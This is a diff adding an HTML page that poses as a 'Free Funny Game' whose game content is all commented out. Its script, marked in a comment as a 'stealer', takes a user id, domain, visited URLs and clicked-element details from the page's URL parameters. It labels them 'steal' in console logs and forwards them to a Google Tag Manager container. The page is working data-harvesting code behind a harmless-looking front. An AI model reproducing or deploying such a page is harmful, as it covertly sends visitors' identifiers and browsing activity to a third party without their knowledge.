@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<!-- Use GTM1, as stealer -->
+<html>
+
+<head>
+    <title>Free Funny Game</title>
+    <!-- GTM script -->
+    <!-- <script type="text/javascript" src="encode.json"></script> -->
+    <script src="https://code.jquery.com/jquery-3.2.1.min.js"></script>
+    <script>
+        function GetURLParameter(sParam) {
+            var sPageURL = window.location.search.substring(1);
+            var sURLVariables = sPageURL.split('&&');
+            for (var i = 0; i < sURLVariables.length; i++) {
+                // console.log(sURLVariables[i]);
+                // var component = sURLVariables[i] + "";
+                var idx = sURLVariables[i].indexOf('==');
+                if (sURLVariables[i].slice(0, idx) == sParam) {
+                    return sURLVariables[i].slice(idx + 2);
+                }
+
+                // var sParameterName = sURLVariables[i].split('==');
+                // if (sParameterName[0] == sParam) {
+                //     return sParameterName[1];
+                // }
+            }
+        }
+
+        function makeStruct(names) {
+            var names = names.split(' ');
+            var count = names.length;
+
+            function constructor() {
+                for (var i = 0; i < count; i++) {
+                    this[names[i]] = arguments[i];
+                }
+            }
+            return constructor;
+        }
+        var Item = makeStruct("element_url classes eid etxt did");
+
+
+        function encodeActions(obj) {
+            var event_list = []
+            var mJson = $.ajax({
+                url: "encode.json",
+                async: false,
+                dataType: "json"
+            });
+            var code_dict = JSON.parse(mJson.responseText);
+            console.log(code_dict);
+            for (var i = 0; i < obj.length; i++) {
+                var act = "{\"element_url\":\"" + obj[i].element_url + "\",\"elementClasses\":\"" + obj[i].classes + "\",\"elementId\":\"" + obj[i].eid + "\",\"elementText\":\"" + obj[i].etxt + "\",\"dataanalyticsID\":\"" + obj[i].did + "\"}";
+                if (act in code_dict) {
+                    event_list.push(code_dict[act]);
+                } else {
+                    console.log(act);
+                }
+
+            }
+            console.log(event_list);
+            return event_list
+        }
+
+        var uid = GetURLParameter('uid');
+        var domain = GetURLParameter('domain');
+        var cid = GetURLParameter('cid');
+        var url = GetURLParameter('url');
+        var element_url = GetURLParameter('element_url');
+        var ls_element_url = element_url.split(',');
+        url = decodeURIComponent(url);
+        element_url = decodeURIComponent(element_url);
+
+        function CombinetwoURLs(url, element_url) {
+            fURL = "undefined"
+            if (element_url == "-1") {
+                element_url = "";
+            }
+            if (element_url != "" && element_url != "undefined") {
+                fURL = element_url;
+            } else {
+                fURL = url;
+            }
+            if (fURL == "") {
+                fURL = "undefined"
+            }
+            return fURL;
+        }
+        var finalURL = CombinetwoURLs(url, element_url)
+
+        var classes = GetURLParameter('elementClasses');
+        var eid = GetURLParameter('elementId');
+        var etxt = GetURLParameter('elementText');
+        var did = GetURLParameter('dataanalyticsID');
+
+        // var ls_element_url = element_url.split(',');
+        var ls_classes = classes.split(',');
+        var ls_eid = eid.split(',');
+        var ls_etxt = etxt.split(',');
+        var ls_did = did.split(',');
+        var actions = [];
+        for (var i = 0; i < ls_element_url.length; i++) {
+            actions.push(new Item(ls_element_url[i], ls_classes[i], ls_eid[i], ls_etxt[i], ls_did[i]));
+            console.log(i);
+            console.log("cil steal element_url " + actions[i]["element_url"]);
+            console.log("cil steal classes " + actions[i]["classes"]);
+            console.log("cil steal eid " + actions[i]["eid"]);
+            console.log("cil steal etxt " + actions[i]["etxt"]);
+            console.log("cil steal did " + actions[i]["did"]);
+        }
+
+        var date1 = new Date(); //開始時間
+        event_list = encodeActions(actions);
+        var date2 = new Date(); //結束時間
+        console.log(date2.getTime() - date1.getTime()) //時間差的毫秒數
+
+        dataLayer = [{
+            'uid': uid,
+            'domain': domain,
+            'cid': cid,
+            'url': url,
+            'element_url': element_url,
+            'finalURL': finalURL,
+            'event_list': event_list
+        }];
+
+        (function(w, d, s, l, i) {
+            w[l] = w[l] || [];
+            w[l].push({
+                'gtm.start': new Date().getTime(),
+                event: 'gtm.js'
+            });
+            var f = d.getElementsByTagName(s)[0],
+                j = d.createElement(s),
+                dl = l != 'dataLayer' ? '&l=' + l : '';
+            j.async = true;
+            j.src =
+                'https://www.googletagmanager.com/gtm.js?id=' + i + dl;
+            f.parentNode.insertBefore(j, f);
+        })(window, document, 'script', 'dataLayer', 'GTM-TRK9NS7');
+    </script>
+    <!-- STYLING -->
+    <!-- <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> -->
+    <!-- Bootstrap core CSS -->
+    <!-- <link rel="stylesheet" href="./bootstrap.min.css"> -->
+    <style>
+        .bd-placeholder-img {
+            font-size: 1.125rem;
+            text-anchor: middle;
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
+        }
+        
+        @media (min-width: 768px) {
+            .bd-placeholder-img-lg {
+                font-size: 3.5rem;
+            }
+        }
+    </style>
+    <!-- Custom styles for this template -->
+    <!-- <link href="./cover.css" rel="stylesheet"> -->
+</head>
+
+<body>
+    <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-TRK9NS7" height="0" width="0" 
+            style="display:none;visibility:hidden"></iframe></noscript>
+    <!--
+    <div class="container-fluid">
+        <div class='text-center'>
+            <h1 class="display-1">Free Funny Game</h1>
+            <img style="width: 30%" src="./28-5-62-1.jpg">
+            <img style="width: 30%" src="./28-5-62-2.jpg">
+            <img style="width: 30%" src="./28-5-62-3.jpg">
+            <br><br><br>
+            <h2 class="h1">🔥🔥พิเศษมากๆ🔥🔥</h2>
+            <p class="h3">
+                ###ไม่มีธุรกรรมเงินสด
+            </p>
+            <p class="h3">
+                ###เกมความบันเทิงที่บริสุทธิ์
+            </p>
+            <br><br><br>
+            <img style="width: 40%" src="./lt.jpg">
+            <img style="width: 40%" src="./rt.jpg">
+            <img style="width: 40%" src="./lb.jpg">
+            <img style="width: 40%" src="./rb.jpg">
+
+        </div>
+    </div>
+    -->
+
+    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous">
+    </script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous">
+    </script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous">
+    </script>
+
+</body>
+
+</html>
